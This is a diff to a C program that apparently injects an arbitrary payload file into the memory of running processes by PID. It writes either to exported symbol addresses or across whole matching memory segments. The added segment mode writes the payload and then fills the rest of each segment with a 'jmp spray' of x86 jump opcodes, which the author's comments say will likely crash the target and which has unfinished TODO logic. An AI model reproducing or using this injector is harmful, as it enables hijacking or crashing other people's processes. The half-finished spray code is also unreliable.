@@ -410,39 +410,73 @@ int main(int argc, char* argv[]) {
     if(arg_inject_all) {
         fprintf(stderr, "[W] Ignoring exports, injecting into matching memory segments only!\n");
         
+        //WIP: we should also attempt write to segments
+        //Write to any matching memory segment
         match_t* current_m = matches;
+        size_t segment_size = 0;
+
         while(current_m) {
-            if(arg_verbosity>0)
-                printf("[.] Attempting write of %s (%lu bytes) to PID: %d -> '%s' @ %p...\n", arg_payload_path, payload_len, current_m->pid, current_m->path, current_m->start);
-            
-            int err = write_payload(current_m->pid, payload, payload_len, current_m->start, arg_process_vm);
-            if (err == -1) {
-                fprintf(stderr, "[E] Failed to call write_payload @ %p (errno: %d).\n", current_m->start, errno);
-            } else {
-                injected++;
+            segment_size = current_m->end - current_m->start;
+
+            for(int i=0; i<(segment_size/payload_len);i++) {
+                //TODO: do math so we don't end up out of bound, also find clever way to align our code to whats underneath.
+                //if it is our first write, write payload , else write jmp current_m->start
+                size_t write_size;
+                void* write_addr;
+                int err;
+                if(i==0) {
+                    //write payload
+                    write_size = payload_len;
+                    write_addr = current_m->start;
+
+                    if(arg_verbosity>0)
+                        printf("[.] Attempting payload write of %s (%lu bytes) to PID: %d from %p to %p...\n", arg_payload_path, write_size, current_m->pid, write_addr, write_addr+write_size);
+                
+                    err = write_payload(current_m->pid, payload, write_size, write_addr, arg_process_vm);
+                    if (err == -1) {
+                        fprintf(stderr, "[E] Failed to call write_payload @ %p (errno: %d).\n", write_addr, errno);
+                    } else {
+                        injected++;
+                    }
+                } else {
+                    //write jmp spray a.k.a. spray&pray (this will most likely crash the process)
+                    //TODO: actually put values in here, we should also align ourselves somehow to first instruction?
+                    char* jmp_spray = "\xe9\x00\x00\x00\x00";
+                    write_size = 5;
+                    write_addr = (current_m->start+payload_len)+(write_size*i);
+
+                    if(arg_verbosity>2)
+                        printf("[.] Attempting jmp spray write of %s (%lu bytes) to PID: %d from %p to %p...\n", arg_payload_path, write_size, current_m->pid, write_addr, write_addr+write_size);
+                    err = write_payload(current_m->pid, jmp_spray, write_size, write_addr, arg_process_vm);
+                    if (err == -1) {
+                       fprintf(stderr, "[E] Failed to call write_payload @ %p (errno: %d).\n", write_addr, errno);
+                    }
+                }
             }
-            current_m=current_m->next;
+            
+            current_m = current_m->next;
         }
     } else if(arg_payload_path != NULL) {
-        export_t* current = exports;
-        while(current) {
+        //Write to any matching exports.
+        export_t* current_e = exports;
+        while(current_e) {
             if(arg_verbosity>0)
-                printf("[.] Attempting write of %s (%lu bytes) to PID: %d -> '%s' @ %p...\n", arg_payload_path, payload_len, current->pid, current->name, current->addr);
+                printf("[.] Attempting write of %s (%lu bytes) to PID: %d -> '%s' @ %p...\n", arg_payload_path, payload_len, current_e->pid, current_e->name, current_e->addr);
 
-            int err = write_payload(current->pid, payload, payload_len, current->addr, arg_process_vm);
+            int err = write_payload(current_e->pid, payload, payload_len, current_e->addr, arg_process_vm);
             if (err == -1) {
-                fprintf(stderr, "[E] Failed to call write_payload @ %p (errno: %d).\n", current->addr, errno);
+                fprintf(stderr, "[E] Failed to call write_payload @ %p (errno: %d).\n", current_e->addr, errno);
             } else {
                 injected++;
             }
 
-            current=current->next;
+            current_e=current_e->next;
         }
     }
 
     //If we injected to at least 1 process it's a win
     if(injected>0) {
-        printf("[*] Yay! Successfully Wrote payload to %d processes!\n", injected);
+        printf("[*] Yay! Successfully Wrote payload to %d locations!\n", injected);
         return EXIT_SUCCESS;
     } else {
         printf("[-] Boo! No payloads written.\n");
